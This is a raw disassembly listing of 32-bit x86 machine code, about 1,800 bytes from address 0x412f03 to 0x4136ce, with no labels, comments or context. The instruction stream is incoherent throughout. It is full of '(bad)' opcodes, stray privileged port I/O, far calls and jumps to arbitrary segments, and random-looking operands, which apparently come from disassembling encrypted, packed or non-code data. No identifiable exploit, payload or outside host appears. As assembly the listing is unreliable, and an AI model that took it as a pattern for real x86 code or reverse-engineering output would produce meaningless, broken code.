  412f03:	(bad)  
  412f04:	les    edx,FWORD PTR ds:0xa16a6d7c
  412f0a:	add    DWORD PTR [eax-0x16],esi
  412f0d:	inc    esi
  412f0e:	mov    DWORD PTR [ecx+0x33568141],ebx
  412f14:	cmp    ecx,0x50
  412f17:	hlt    
  412f18:	loop   0x412e9c
  412f1a:	push   ss
  412f1b:	mov    dh,0xa1
  412f1d:	rol    DWORD PTR [ecx-0x6a379353],cl
  412f23:	test   esp,edx
  412f25:	xchg   dh,dh
  412f27:	mov    dh,0x3e
  412f29:	ror    BYTE PTR [eax],1
  412f2b:	retf   
  412f2c:	(bad)  
  412f2d:	xor    al,0x96
  412f2f:	inc    edi
  412f30:	cld    
  412f31:	test   BYTE PTR [ebp-0xb],al
  412f34:	pop    edi
  412f35:	xor    dh,BYTE PTR [edi+0x9af4faf]
  412f3b:	lods   eax,DWORD PTR ds:[esi]
  412f3c:	sbb    al,0x14
  412f3e:	out    dx,eax
  412f3f:	mov    eax,ds:0x8470e9e3
  412f44:	pop    esi
  412f45:	imul   esp,DWORD PTR [edx+0xef5ca44],0x32
  412f4c:	in     eax,dx
  412f4d:	popf   
  412f4e:	cmp    al,0x82
  412f50:	hlt    
  412f51:	test   DWORD PTR [ebx+edx*1-0x30],ecx
  412f55:	adc    eax,0xebcc0035
  412f5a:	pusha  
  412f5b:	imul   DWORD PTR [eax+0xd]
  412f5e:	mov    edx,0x651a88c1
  412f63:	cmp    cl,BYTE PTR [ebx+ebp*2+0xb]
  412f67:	pop    edi
  412f68:	das    
  412f69:	sbb    BYTE PTR [eax],dl
  412f6b:	(bad)  
  412f6c:	stos   BYTE PTR es:[edi],al
  412f6d:	int3   
  412f6e:	call   0xbbca3d1a
  412f73:	pop    edi
  412f74:	xchg   ah,cl
  412f76:	cmp    ebx,DWORD PTR [edi]
  412f78:	test   ebp,esi
  412f7a:	in     eax,dx
  412f7b:	push   edi
  412f7c:	cld    
  412f7d:	mul    DWORD PTR [ebx-0x700e2e16]
  412f83:	inc    ebp
  412f84:	in     al,dx
  412f85:	adc    al,0x8c
  412f87:	mov    WORD PTR [edx],?
  412f89:	nop
  412f8a:	shr    esi,1
  412f8c:	and    DWORD PTR [ecx+0x28],ebp
  412f8f:	pop    esp
  412f90:	cld    
  412f91:	or     eax,esp
  412f93:	or     al,0xfc
  412f95:	mov    esp,0xbdee674c
  412f9a:	mov    cs,edi
  412f9c:	pop    esp
  412f9d:	and    bh,al
  412f9f:	jmp    0x412fb6
  412fa1:	loopne 0x412f53
  412fa3:	and    al,0xb7
  412fa5:	jno    0x412fe7
  412fa7:	out    0xc3,ax
  412faa:	cmp    DWORD PTR [edi-0x7a],ebp
  412fad:	into   
  412fae:	ja     0x412f4d
  412fb0:	mov    bl,0x40
  412fb2:	dec    ebx
  412fb3:	push   DWORD PTR [eax-0x61439af6]
  412fb9:	pop    ecx
  412fba:	push   eax
  412fbb:	jnp    0x412fa6
  412fbd:	mov    bl,0xaf
  412fbf:	shl    BYTE PTR [edx+0x8],0x7f
  412fc3:	push   esi
  412fc4:	les    edi,FWORD PTR [ecx+0x1289a3b4]
  412fca:	sub    cl,BYTE PTR [ebx]
  412fcc:	sub    al,0xd1
  412fce:	clc    
  412fcf:	call   0xc68d:0x49180219
  412fd6:	ins    BYTE PTR es:[edi],dx
  412fd7:	outs   dx,BYTE PTR ds:[esi]
  412fd8:	dec    ecx
  412fd9:	push   esi
  412fda:	stos   DWORD PTR es:[edi],eax
  412fdb:	test   BYTE PTR [ebx],0xb9
  412fde:	fcom   st(0)
  412fe0:	and    dl,BYTE PTR [eax-0x77]
  412fe3:	test   dl,ah
  412fe5:	mov    cs,WORD PTR [eax]
  412fe7:	mov    esi,0x18f715ba
  412fec:	int3   
  412fed:	inc    eax
  412fee:	inc    edi
  412fef:	xor    ebp,DWORD PTR [edx-0x4a]
  412ff2:	sbb    al,0x3e
  412ff4:	(bad)  
  412ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ff6:	inc    esp
  412ff7:	repnz fcmove st,st(6)
  412ffa:	arpl   WORD PTR [edx],bp
  412ffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ffd:	adc    ah,BYTE PTR [ebx+0x35c26fcd]
  413003:	jge    0x41305e
  413005:	mov    ecx,0x8b9740bd
  41300a:	ins    BYTE PTR es:[edi],dx
  41300b:	stos   BYTE PTR es:[edi],al
  41300c:	mov    ebx,0xffba7546
  413011:	retf   0x5c3a
  413014:	sbb    al,0x14
  413016:	mov    dl,0x8d
  413018:	sub    DWORD PTR [edx-0x51],edx
  41301b:	mov    dl,0x83
  41301d:	xchg   edi,eax
  41301e:	mov    ah,0xd8
  413020:	dec    edx
  413021:	inc    esi
  413022:	xchg   ebp,eax
  413023:	cs (bad) 
  413025:	test   DWORD PTR [esi+0x5a],eax
  413028:	mov    eax,ds:0x7738de4
  41302d:	call   0x61f9a54
  413032:	dec    edx
  413033:	inc    DWORD PTR ds:0xf76a5248
  413039:	sub    ecx,0x8afc80c4
  41303f:	repz cmp esp,DWORD PTR [esp]
  413043:	(bad)  
  413044:	mov    ah,0x45
  413046:	push   edx
  413047:	and    eax,0x19f5a744
  41304c:	adc    eax,0xd692cdb0
  413051:	popa   
  413052:	jl     0x413029
  413054:	repz add esp,DWORD PTR [edx-0x6e]
  413058:	out    dx,eax
  413059:	jl     0x413096
  41305b:	add    BYTE PTR [ebp+0xe],al
  41305e:	jno    0x413059
  413060:	clc    
  413061:	pop    ss
  413062:	(bad)  
  413063:	out    0x41,al
  413065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413066:	fiadd  DWORD PTR [edx+ecx*2+0x7997f0c6]
  41306d:	test   al,bh
  41306f:	jmp    0xc09d:0x943c2896
  413076:	xchg   esi,eax
  413077:	pop    ds
  413078:	into   
  413079:	jns    0x4130fa
  41307b:	jecxz  0x413073
  41307d:	adc    eax,0xc9e61d4
  413082:	or     al,0xe2
  413084:	mov    bl,0x50
  413086:	jge    0x4130e1
  413088:	in     al,dx
  413089:	cs jg  0x413042
  41308c:	and    DWORD PTR [eax],eax
  41308e:	rol    BYTE PTR [ecx+0x45],1
  413091:	loopne 0x413096
  413093:	int3   
  413094:	daa    
  413095:	test   BYTE PTR [ebx],bh
  413097:	pop    eax
  413098:	daa    
  413099:	aaa    
  41309a:	scas   al,BYTE PTR es:[edi]
  41309b:	fcomi  st,st(7)
  41309d:	or     al,0x16
  41309f:	cmp    eax,0x6270e405
  4130a4:	pop    edx
  4130a5:	scas   al,BYTE PTR es:[edi]
  4130a6:	test   BYTE PTR ds:0xcad05d94,al
  4130ac:	pop    edi
  4130ad:	dec    edi
  4130ae:	xchg   BYTE PTR ds:0x4345eeed,ah
  4130b4:	aad    0xd4
  4130b6:	mov    dh,0xca
  4130b8:	sbb    edi,DWORD PTR [esp+ebx*2]
  4130bb:	jno    0x4130c4
  4130bd:	or     al,0x2b
  4130bf:	cs cmp eax,0x8a5fade4
  4130c5:	das    
  4130c6:	xchg   esp,eax
  4130c7:	jp     0x41311c
  4130c9:	dec    ecx
  4130ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130cb:	inc    esp
  4130cc:	mov    esi,esi
  4130ce:	mov    ebx,DWORD PTR [eax]
  4130d0:	aad    0x73
  4130d2:	ins    BYTE PTR es:[edi],dx
  4130d3:	jns    0x41314d
  4130d5:	imul   ebx,DWORD PTR ds:[esp+eiz*4-0x2eb52720],0xffffffb7
  4130de:	sub    cl,BYTE PTR [ecx+eax*4+0x163d986d]
  4130e5:	lea    edi,[eax-0x65e0d22f]
  4130eb:	cs adc BYTE PTR es:[eax-0x10dcd5e],dh
  4130f3:	loope  0x4130e6
  4130f5:	pop    esi
  4130f6:	daa    
  4130f7:	sar    DWORD PTR [esi+0x6a6f4337],0xf3
  4130fe:	cdq    
  4130ff:	les    edi,FWORD PTR [ecx+0x78d37116]
  413105:	push   0x69ed801d
  41310a:	fwait
  41310b:	(bad)  
  41310c:	pop    ecx
  41310d:	lods   al,BYTE PTR ds:[esi]
  41310e:	int3   
  41310f:	out    0x98,al
  413111:	mov    esp,0x9f4b82a
  413116:	clc    
  413117:	lods   al,BYTE PTR ds:[esi]
  413118:	mov    dl,0x76
  41311a:	pushf  
  41311b:	retf   
  41311c:	jno    0x4130fa
  41311e:	loopne 0x413160
  413120:	pusha  
  413121:	daa    
  413122:	call   0xb995:0x3043b0d6
  413129:	xor    eax,0x6ad355f
  41312e:	ret    
  41312f:	inc    eax
  413130:	pop    esi
  413131:	and    BYTE PTR [edi-0x19],al
  413134:	test   DWORD PTR [esi],esp
  413136:	int3   
  413137:	icebp  
  413138:	ins    DWORD PTR es:[edi],dx
  413139:	push   ecx
  41313a:	inc    ebx
  41313b:	inc    eax
  41313c:	cmp    BYTE PTR [ebx+0x19],0x5d
  413140:	call   0x1d946c01
  413145:	cmp    ecx,DWORD PTR [esp+ebp*2]
  413148:	mov    cl,0x73
  41314a:	push   esp
  41314b:	push   esi
  41314c:	or     BYTE PTR [ebx+0x5c],0x4d
  413150:	sub    cl,dh
  413152:	sub    DWORD PTR [edi-0x61],edi
  413155:	out    0x1f,al
  413157:	pop    edi
  413158:	mov    al,ds:0x7a4b09b1
  41315d:	test   BYTE PTR [eax-0x6a],bh
  413160:	pop    esp
  413161:	mov    BYTE PTR [ebx],0x3c
  413164:	mov    dh,0x6f
  413166:	std    
  413167:	test   al,0x86
  413169:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41316b:	int3   
  41316c:	leave  
  41316d:	retf   
  41316e:	jg     0x413129
  413170:	mov    al,0xbd
  413172:	add    eax,0x90db9d0f
  413177:	mov    ah,0xb2
  413179:	nop
  41317a:	sbb    bl,BYTE PTR [esi]
  41317c:	scas   eax,DWORD PTR es:[edi]
  41317d:	int3   
  41317e:	iret   
  41317f:	cmp    al,0x85
  413181:	and    al,0x1e
  413183:	mov    eax,ds:0xdf1b8c2e
  413188:	js     0x4131b6
  41318a:	into   
  41318b:	fst    QWORD PTR [eax]
  41318d:	sar    BYTE PTR [ebp+0x38],cl
  413190:	mov    eax,ds:0xcaf63a29
  413195:	inc    ebp
  413196:	sub    BYTE PTR [ecx+0x4b],bl
  413199:	push   ebx
  41319a:	fprem  
  41319c:	xor    edi,DWORD PTR [edx-0x30]
  41319f:	frstor [eax-0x571414c4]
  4131a5:	pop    edx
  4131a6:	xchg   ebx,eax
  4131a7:	popf   
  4131a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131a9:	das    
  4131aa:	je     0x4131ad
  4131ac:	dec    ebp
  4131ad:	mov    es,ebp
  4131af:	push   ecx
  4131b0:	repz or al,0x4d
  4131b3:	add    ebp,DWORD PTR ds:0xa8e8b9ff
  4131b9:	jmp    0xad49ef87
  4131be:	out    dx,eax
  4131bf:	les    edx,FWORD PTR [edx]
  4131c1:	int3   
  4131c2:	int    0xca
  4131c4:	sub    al,0x99
  4131c6:	jp     0x413217
  4131c8:	mov    BYTE PTR [edx+0x6c7410ea],dh
  4131ce:	ja     0x413185
  4131d0:	dec    ecx
  4131d1:	inc    ebp
  4131d2:	add    BYTE PTR [eax+0x326ae2c2],cl
  4131d8:	or     al,0xd4
  4131da:	mov    WORD PTR [eax-0x51fca929],?
  4131e0:	into   
  4131e1:	fsubrp st(1),st
  4131e3:	fcomip st,st(2)
  4131e5:	inc    edi
  4131e6:	sbb    eax,0x3c883071
  4131eb:	mov    esp,0xbd97ae5a
  4131f0:	les    esp,FWORD PTR [ebx]
  4131f2:	pop    ebp
  4131f3:	jo     0x41318b
  4131f5:	rol    al,0xe2
  4131f8:	test   eax,0x8e31a18a
  4131fd:	jae    0x4131b4
  4131ff:	imul   esp,DWORD PTR [esi-0x670316db],0x55170ab2
  413209:	loope  0x4131f7
  41320b:	imul   ecx,DWORD PTR [eax-0x315bf90e],0x8
  413212:	push   cs
  413213:	daa    
  413214:	xor    DWORD PTR [ebx],esi
  413216:	je     0x4131bf
  413218:	out    0xb5,al
  41321a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41321b:	sbb    ah,al
  41321d:	aam    0x6a
  41321f:	xor    bl,al
  413221:	xchg   edx,eax
  413222:	out    0x2a,al
  413224:	pop    es
  413225:	xchg   edx,eax
  413226:	retf   0xee8c
  413229:	fwait
  41322a:	daa    
  41322b:	in     eax,0x7d
  41322d:	(bad)  
  41322f:	and    eax,0xb8cebebd
  413234:	cmp    ecx,DWORD PTR [ebx]
  413236:	xor    esi,esp
  413238:	(bad)  
  41323a:	stc    
  41323b:	(bad)  
  41323d:	mov    eax,DWORD PTR [edx]
  41323f:	in     eax,0x9d
  413241:	sbb    esp,DWORD PTR [eax+0x66e4bff4]
  413247:	out    0xc5,eax
  413249:	adc    eax,0x1c573bff
  41324e:	jle    0x413234
  413250:	ja     0x413272
  413252:	dec    esi
  413253:	gs adc esi,ebp
  413256:	add    eax,0xedb2f30
  41325b:	inc    esi
  41325c:	cld    
  41325d:	xor    DWORD PTR [esi+0x6875f2be],0x76fbff3d
  413267:	jp     0x413213
  413269:	iret   
  41326a:	mov    WORD PTR ds:0x68b0002f,cs
  413270:	or     al,0x3c
  413272:	adc    al,0x6b
  413274:	sub    ebp,ebp
  413276:	jbe    0x413234
  413278:	lods   al,BYTE PTR ds:[esi]
  413279:	js     0x413264
  41327b:	lods   eax,DWORD PTR ds:[esi]
  41327c:	test   BYTE PTR [esi],ch
  41327e:	aad    0xed
  413280:	loopne 0x413224
  413282:	and    ah,BYTE PTR [ebp+0x6d0622d2]
  413288:	cli    
  413289:	je     0x4132bb
  41328b:	xchg   esp,eax
  41328c:	fisubr DWORD PTR [edi]
  41328e:	loop   0x4132ff
  413290:	ds pop esp
  413292:	je     0x413301
  413294:	pop    esp
  413295:	cmp    al,cl
  413297:	mov    ah,0x46
  413299:	mov    dl,0x0
  41329b:	nop
  41329c:	imul   ebx,DWORD PTR [edx-0x61],0x85215dcc
  4132a3:	ret    0xe4c4
  4132a6:	leave  
  4132a7:	jnp    0x413324
  4132a9:	xchg   ecx,eax
  4132aa:	pusha  
  4132ab:	sbb    eax,0x49edcf37
  4132b0:	pop    esp
  4132b1:	sar    BYTE PTR [esp+ebx*1-0x24034a9d],cl
  4132b8:	jmp    0x41323d
  4132ba:	and    bh,BYTE PTR [edx+edx*4+0x61]
  4132be:	jbe    0x41332a
  4132c0:	sbb    al,ch
  4132c2:	aad    0xd3
  4132c4:	int    0x47
  4132c6:	inc    ebx
  4132c7:	sbb    bl,dl
  4132c9:	popa   
  4132ca:	add    eax,0x38d6787b
  4132cf:	sar    edx,0xd2
  4132d2:	ds push es
  4132d4:	nop
  4132d5:	clc    
  4132d6:	xchg   esi,eax
  4132d7:	xchg   edi,eax
  4132d8:	push   ss
  4132d9:	sub    edi,DWORD PTR [edi]
  4132db:	mov    edx,0x9ceb2a61
  4132e0:	ror    DWORD PTR [ecx-0x723646b0],0x4c
  4132e7:	jl     0x4132a5
  4132e9:	pop    edx
  4132ea:	or     dh,BYTE PTR [edx]
  4132ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132ed:	fistp  DWORD PTR [ebp+0x40946732]
  4132f3:	mov    al,0xe3
  4132f5:	cmc    
  4132f6:	mov    DWORD PTR [esi],esi
  4132f8:	push   esp
  4132f9:	lahf   
  4132fa:	and    BYTE PTR [ebp-0x6c],bh
  4132fd:	pop    edx
  4132fe:	or     al,0xf4
  413300:	(bad)  
  413301:	je     0x41331d
  413303:	das    
  413304:	and    cl,BYTE PTR [eax-0x7d282618]
  41330a:	mov    ds:0x23a293f,eax
  41330f:	jp     0x413319
  413311:	test   al,0x5f
  413313:	xchg   BYTE PTR [ebp-0x6b],ch
  413316:	cmp    al,0xc9
  413318:	ja     0x4132a4
  41331a:	adc    al,0x18
  41331c:	and    dh,ah
  41331e:	pop    eax
  41331f:	mov    DWORD PTR [ebx+edx*2],ebp
  413322:	adc    esi,DWORD PTR [esi+0x2d]
  413325:	cdq    
  413326:	push   ds
  413327:	xlat   BYTE PTR ds:[ebx]
  413328:	or     ebx,DWORD PTR [ebx]
  41332a:	fidiv  WORD PTR [ebx]
  41332c:	aas    
  41332d:	inc    ecx
  41332e:	ret    
  41332f:	aas    
  413330:	int    0x91
  413332:	aam    0xf5
  413334:	jecxz  0x413342
  413336:	and    DWORD PTR [edx+0x33],0x7a
  41333a:	enter  0xfb4e,0x91
  41333e:	dec    ebx
  41333f:	jle    0x413338
  413341:	es pop es
  413343:	mov    ebx,0x5c88f012
  413348:	jecxz  0x413322
  41334a:	out    0x8,eax
  41334c:	mov    ah,0x75
  41334e:	lods   eax,DWORD PTR ds:[esi]
  41334f:	popf   
  413350:	and    DWORD PTR [ebx],0x13
  413353:	mov    ebx,0x7017379c
  413358:	cmp    BYTE PTR [ebx-0x580deb7b],ch
  41335e:	(bad)  
  41335f:	sub    DWORD PTR [ebx],edi
  413361:	adc    cl,BYTE PTR [edx-0x46080e3c]
  413367:	je     0x41335d
  413369:	pop    es
  41336a:	ret    
  41336b:	mov    eax,0xe1c3bc65
  413370:	jg     0x413387
  413372:	rcl    BYTE PTR [esi],0x21
  413375:	adc    DWORD PTR [eax-0x1972d4d3],0x3cde65b5
  41337f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413380:	call   0x2f83:0x139f5e87
  413387:	jb     0x413367
  413389:	ss icebp 
  41338b:	gs pop ecx
  41338d:	ins    DWORD PTR es:[edi],dx
  41338e:	mov    bh,0xf9
  413390:	jl     0x4133fb
  413392:	mul    DWORD PTR [edi+0x52880cc2]
  413398:	add    BYTE PTR [ecx],ch
  41339a:	call   0x9a85:0x4b819e00
  4133a1:	inc    ebp
  4133a2:	and    eax,0x92829a6
  4133a7:	lods   eax,DWORD PTR ds:[esi]
  4133a8:	adc    al,0x8d
  4133aa:	lahf   
  4133ab:	cmc    
  4133ac:	outs   dx,BYTE PTR ds:[esi]
  4133ad:	outs   dx,DWORD PTR ds:[esi]
  4133ae:	xor    DWORD PTR [ebx-0xf],ebx
  4133b1:	ret    0x25de
  4133b4:	(bad)  
  4133b5:	add    esi,DWORD PTR [edi]
  4133b7:	fild   QWORD PTR [edx-0x2]
  4133ba:	mov    ah,BYTE PTR [eax-0x60]
  4133bd:	out    0x5c,eax
  4133bf:	mov    bl,BYTE PTR [edx+0x22b49e41]
  4133c5:	clc    
  4133c6:	imul   edx,ebx,0xffffff99
  4133c9:	push   ds
  4133ca:	pop    es
  4133cb:	dec    edi
  4133cc:	fcmovbe st,st(3)
  4133ce:	sbb    DWORD PTR [eax-0x74b63bc9],esp
  4133d4:	xchg   ebp,eax
  4133d5:	imul   ebp,eax,0x70358faa
  4133db:	loope  0x4133a8
  4133dd:	scas   eax,DWORD PTR es:[edi]
  4133de:	mov    ds:0x5d72385b,al
  4133e3:	xchg   esi,eax
  4133e4:	sbb    eax,0xde1f7ae8
  4133e9:	shl    BYTE PTR [ebx+eiz*4-0x15],1
  4133ed:	mov    WORD PTR [edx+ecx*1-0x35683e9b],?
  4133f4:	cmp    BYTE PTR [ecx+eiz*4],0xb1
  4133f8:	adc    dh,ah
  4133fa:	inc    edi
  4133fb:	jo     0x413427
  4133fd:	sahf   
  4133fe:	jbe    0x413388
  413400:	and    BYTE PTR [eax-0x26c1547],ah
  413406:	mov    ds:0x6acd0ba7,al
  41340b:	int3   
  41340c:	jno    0x41346e
  41340e:	pop    edx
  41340f:	pop    esi
  413410:	sbb    BYTE PTR [edi+ecx*8],al
  413413:	dec    edx
  413414:	mov    esi,0x16b61395
  413419:	xor    al,0x37
  41341b:	mov    DWORD PTR [ecx-0x1],esp
  41341e:	inc    edi
  41341f:	rcr    DWORD PTR [ebx+0x2c5ddb5c],1
  413425:	mov    eax,0x231903ad
  41342a:	and    edx,0x4a
  41342d:	test   cl,0x8c
  413430:	mov    ebp,0xf67959ce
  413435:	lods   eax,DWORD PTR ds:[esi]
  413436:	push   ds
  413437:	push   edi
  413438:	xor    cl,BYTE PTR [ebx]
  41343a:	xchg   edx,eax
  41343b:	fwait
  41343c:	pop    ds
  41343d:	test   al,0x77
  41343f:	sub    DWORD PTR [esi],0xffffffbf
  413442:	pop    ebp
  413443:	pop    edi
  413444:	xlat   BYTE PTR ds:[ebx]
  413445:	lea    esp,[edx-0x48c100b8]
  41344b:	jno    0x4133ea
  41344d:	push   ecx
  41344e:	nop
  41344f:	pop    ebx
  413450:	jae    0x41348f
  413452:	push   ebp
  413453:	and    DWORD PTR [esi-0x781b3191],esp
  413459:	cmp    BYTE PTR [edx],dh
  41345b:	pop    ds
  41345c:	jbe    0x4134bb
  41345e:	lea    ebx,[edi]
  413460:	mov    bh,0x3b
  413462:	dec    edi
  413463:	fwait
  413464:	sub    BYTE PTR [eax+0x45],0x9f
  413468:	ja     0x413404
  41346a:	arpl   WORD PTR ds:0xc5fe1dab,si
  413470:	adc    eax,0x556f2250
  413475:	pusha  
  413476:	fld    st(3)
  413478:	sub    DWORD PTR [edi-0x5e],eax
  41347b:	cmp    BYTE PTR [esi+0x419cd30c],ah
  413481:	adc    al,BYTE PTR [ecx]
  413483:	push   ss
  413484:	(bad)
  413487:	sbb    ecx,esp
  413489:	arpl   cx,ax
  41348b:	mov    al,0xb6
  41348d:	and    al,0x51
  41348f:	mov    BYTE PTR [eax+0xd1ad015],ch
  413495:	jb     0x41341a
  413497:	push   eax
  413498:	retw   0x793a
  41349c:	push   cs
  41349d:	mov    esi,0x90aefa60
  4134a2:	push   edi
  4134a3:	pop    ecx
  4134a4:	push   ds
  4134a5:	call   0x78d0:0xc4cd575f
  4134ac:	xchg   ebp,eax
  4134ad:	mov    ecx,0x1277e3a4
  4134b2:	adc    al,bh
  4134b4:	out    dx,al
  4134b5:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4134b7:	xchg   DWORD PTR [ebx+0x1],ecx
  4134ba:	into   
  4134bb:	xor    al,0xa4
  4134bd:	or     ecx,ebx
  4134bf:	sbb    edi,DWORD PTR [esi+0x23daf6c0]
  4134c5:	and    al,0xc1
  4134c7:	iret   
  4134c8:	sar    dl,cl
  4134ca:	test   DWORD PTR ss:[edi-0x41],eax
  4134ce:	jg     0x413492
  4134d0:	imul   ebx,eax,0x72bd2566
  4134d6:	mov    esp,0x4f9080ff
  4134db:	lock popf 
  4134dd:	les    ebx,FWORD PTR [esi]
  4134df:	imul   ecx,esi,0x37
  4134e2:	into   
  4134e3:	pop    es
  4134e4:	mov    ch,0xe6
  4134e6:	cmp    al,0xdc
  4134e8:	sub    al,0x5a
  4134ea:	repnz inc edx
  4134ec:	fstp   QWORD PTR [ecx+ebp*4]
  4134ef:	pop    eax
  4134f0:	inc    edx
  4134f1:	lods   al,BYTE PTR ds:[esi]
  4134f2:	push   0x6d1514c4
  4134f7:	sub    DWORD PTR [ebx],eax
  4134f9:	mov    edi,0x967800a0
  4134fe:	adc    al,0xbd
  413500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413501:	mov    BYTE PTR [edx-0x453dfa0d],bh
  413507:	cmc    
  413508:	inc    DWORD PTR [edi+ecx*8-0x4eb46747]
  41350f:	cmp    eax,0x196dcecb
  413514:	fdiv   st,st(4)
  413516:	inc    ecx
  413517:	sbb    DWORD PTR [esi+0x22c4a3d3],ebx
  41351d:	retf   
  41351e:	pop    ecx
  41351f:	jmp    0x8a1c6f89
  413524:	dec    eax
  413525:	(bad)  
  413526:	idiv   DWORD PTR [ecx-0x702918ea]
  41352c:	pop    edx
  41352d:	loope  0x413535
  41352f:	and    bl,BYTE PTR ds:0x9e66bee9
  413535:	adc    al,0x63
  413537:	xchg   esp,eax
  413538:	ja     0x41357b
  41353a:	sub    BYTE PTR [edi-0x3b],bh
  41353d:	jecxz  0x413573
  41353f:	pusha  
  413540:	in     al,0x36
  413542:	cdq    
  413543:	add    eax,0x8e8700d7
  413548:	sbb    ebx,ecx
  41354a:	sahf   
  41354b:	(bad)  
  41354c:	icebp  
  41354d:	bound  ebx,QWORD PTR [esi-0x3a]
  413550:	mov    bl,cl
  413552:	rcr    DWORD PTR [edx+ecx*4],cl
  413555:	shl    BYTE PTR [ebp*2+0x1dbbf132],cl
  41355c:	mov    bl,0x6b
  41355e:	mov    esp,0x3cbf0078
  413563:	aas    
  413564:	retf   0x825c
  413567:	std    
  413568:	ficom  DWORD PTR [edi-0x5f]
  41356b:	add    DWORD PTR [edi-0x75856260],ebx
  413571:	cmp    eax,0x797f4096
  413576:	inc    ecx
  413577:	sti    
  413578:	clc    
  413579:	push   ebp
  41357a:	or     ch,0xb3
  41357d:	(bad)  
  41357e:	rol    cl,0x91
  413581:	fcomp  QWORD PTR [ebp-0x62]
  413584:	stc    
  413585:	mov    ebp,0x8f20f171
  41358a:	push   ss
  41358b:	xchg   BYTE PTR [ebx],ah
  41358d:	jno    0x413577
  41358f:	sar    DWORD PTR [esi],1
  413591:	or     edx,DWORD PTR [ebp+0x7de8cc38]
  413597:	and    ebx,ebp
  413599:	xchg   BYTE PTR [eax+0x3c6c52c5],ch
  41359f:	inc    ebx
  4135a0:	jns    0x413529
  4135a2:	ret    0x6ae6
  4135a5:	jbe    0x41352e
  4135a7:	inc    ebx
  4135a8:	jnp    0x4135d4
  4135aa:	jg     0x41352d
  4135ac:	shl    DWORD PTR [edx+0x51],cl
  4135af:	cmc    
  4135b0:	int    0x9b
  4135b2:	xchg   ebx,eax
  4135b3:	lods   eax,DWORD PTR ds:[esi]
  4135b4:	loop   0x4135af
  4135b6:	xor    ebx,esi
  4135b8:	arpl   sp,ax
  4135ba:	in     al,dx
  4135bb:	sub    DWORD PTR [esi-0x14b78670],ebx
  4135c1:	mov    eax,ds:0xc6e96300
  4135c6:	add    edi,0x295c7421
  4135cc:	adc    ah,BYTE PTR es:[ebp+0x70fed9de]
  4135d3:	fst    DWORD PTR [esi+edi*4+0x5eddc84b]
  4135da:	mov    al,0x79
  4135dc:	mov    esp,0x172170c8
  4135e1:	push   ebx
  4135e2:	adc    al,0x3c
  4135e4:	ror    al,1
  4135e6:	into   
  4135e7:	cmp    BYTE PTR [esi-0x14cd23b0],0x6f
  4135ee:	mov    dl,0xf3
  4135f0:	add    eax,0x886a3d8f
  4135f5:	jle    0x4135f2
  4135f7:	xchg   esi,eax
  4135f8:	sahf   
  4135f9:	dec    esi
  4135fa:	xchg   al,ah
  4135fc:	xchg   ecx,eax
  4135fd:	sub    al,0x33
  4135ff:	fadd   st(4),st
  413601:	sbb    BYTE PTR [eax+0x6d],dh
  413604:	inc    esp
  413605:	mov    bp,0xc51a
  413609:	test   al,0x7c
  41360b:	mov    al,dl
  41360d:	cmp    DWORD PTR [edx],0xdf34e74
  413613:	xchg   DWORD PTR [ebx-0x6a],ebx
  413616:	fimul  WORD PTR gs:[edx-0x5f9090d1]
  41361d:	int3   
  41361e:	sti    
  41361f:	xchg   ecx,eax
  413620:	(bad)  
  413621:	dec    edx
  413622:	mov    ebp,0xd6e640a2
  413627:	pop    esi
  413628:	das    
  413629:	(bad)  
  41362a:	pop    edi
  41362b:	fcom   DWORD PTR [ecx+0x8c66716]
  413631:	sub    eax,DWORD PTR [ecx+0x6d]
  413634:	cmp    al,0x10
  413636:	jmp    0x15fa:0x3d1b5d12
  41363d:	daa    
  41363e:	fcom   st(4)
  413640:	ret    
  413641:	hlt    
  413642:	jmp    0x41368d
  413644:	(bad)  
  413645:	mov    bh,0x3
  413647:	fild   WORD PTR [edx+0x5a11a71a]
  41364d:	add    ah,0xf9
  413650:	push   ebx
  413651:	(bad)  
  413652:	and    DWORD PTR [eax+0x5b],eax
  413655:	rcr    DWORD PTR ds:0xd475ffb9,0xce
  41365c:	call   0x5109ea8b
  413661:	mov    cl,0xc3
  413663:	jnp    0x4136dd
  413665:	add    DWORD PTR [edx+0x15],esi
  413668:	imul   eax,DWORD PTR [ebx-0x55],0x57
  41366c:	fwait
  41366d:	stos   BYTE PTR es:[edi],al
  41366e:	pop    ss
  41366f:	sub    BYTE PTR [ecx+0xb],0xc6
  413673:	sub    ch,BYTE PTR [ebx+0x523f8ee0]
  413679:	inc    ebx
  41367a:	(bad)  [esi+edx*2-0x29]
  41367e:	dec    esp
  41367f:	enter  0x21f,0x28
  413683:	xchg   esp,eax
  413684:	jb     0x413674
  413686:	dec    ebx
  413687:	dec    eax
  413688:	xchg   ecx,eax
  413689:	daa    
  41368a:	sub    al,al
  41368c:	stos   DWORD PTR es:[edi],eax
  41368d:	xor    bh,ch
  41368f:	xchg   ebx,eax
  413690:	pop    ds
  413691:	dec    ebp
  413692:	lock mov ds,eax
  413695:	xor    ah,BYTE PTR [ebp+0x7b5a72dd]
  41369b:	pop    ss
  41369c:	pop    es
  41369d:	cmp    dh,BYTE PTR [edi+0x71]
  4136a0:	sti    
  4136a1:	leave  
  4136a2:	fwait
  4136a3:	pop    ss
  4136a4:	and    edx,DWORD PTR [edi]
  4136a6:	pop    esp
  4136a7:	dec    esp
  4136a8:	push   ss
  4136a9:	cmp    DWORD PTR [esi],edi
  4136ab:	cld    
  4136ac:	cmp    esp,ebx
  4136ae:	mov    esp,ebx
  4136b0:	es ja  0x4136ed
  4136b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136b4:	jne    0x41368c
  4136b6:	jnp    0x4136d3
  4136b8:	add    BYTE PTR ds:0x496cd82f,al
  4136be:	in     al,0x7
  4136c0:	and    eax,0x1ab7906a
  4136c5:	push   es
  4136c6:	mov    al,0x6e
  4136c8:	outs   dx,DWORD PTR ds:[esi]
  4136c9:	xchg   BYTE PTR [ebp-0x69],dh
  4136cc:	xor    al,0x81
  4136ce:	xchg   ecx,eax
